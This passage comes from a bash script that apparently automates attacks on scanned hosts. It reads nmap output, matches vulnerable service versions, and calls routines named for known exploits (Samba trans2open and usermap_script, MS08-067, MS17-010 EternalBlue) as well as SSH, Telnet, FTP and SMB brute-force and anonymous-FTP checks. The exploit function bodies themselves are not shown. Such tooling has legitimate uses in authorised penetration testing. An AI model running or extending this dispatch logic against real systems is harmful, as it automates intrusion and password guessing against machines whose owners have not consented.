						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					fi
				fi
#################   smb       ####################################################################
				if [ "$ostype" = "Linux" ] || [ "$ostype" = "linux" ] || [ "$ostype" = "embedded" ]
				then
					if [ "$name" = "netbios-ssn" ] && [ "$product" = "Samba smbd" ]
					then
						if [ "$smbVersion" = "Samba 2.2.1a" ]
						then
							trans2open
						elif [ "$smbVersion" = "Samba 3.0.20-Debian" ] && [ "$version" = "3.X - 4.X" ]
						then
							usermap_script
						fi
					fi
				fi
			done <$ips/version.txt
##################   smb       ####################################################################
				if [ "$ostype" = "Windows" ] || [ "$ostype" = "windows" ] || [ "$ostype" = "embedded" ]
				then
					if [ "$name" = "netbios-ssn" ] && [ "$product" = "Microsoft Windows netbios-ssn" ]
					then
						while read smbvulnID
						do
							if [ "$smbvulnID" = "ms08-067" ] || [ "$smbvulnID" = "MS08-067" ]
							then
								ms08_067_netapi
							elif [ "$smbvulnID" = "ms17-010" ] || [ "$smbvulnID" = "MS17-010" ]
							then
								ms17_010_eternalblue
							fi
						done <$ips/nmapSMBVuln.txt
					fi
				fi
        done <$ips/product.txt
		if [ "$name" = "rpcbind" ]
		then
			smbclient
		elif [ "$name" = "ssh" ]
		then
			sshBruteForce
		elif [ "$name" = "telnet" ]
		then
			telnetBruteForce
		elif [ "$name" = "ftp" ] && [ allowed="$(cat $ips/$ips.xml | grep -oP 'Anonymous FTP login \K[^ ]+')" = "allowed" ]
		then
			ftpAnonymous
		elif [ "$name" = "ftp" ]
		then
			ftpBruteForce
		elif [ "$name" = "netbios-ssn" ]
		then
			smbBruteForce
		fi
    done <$ips/name.txt
	echo "########################################"
done
report3
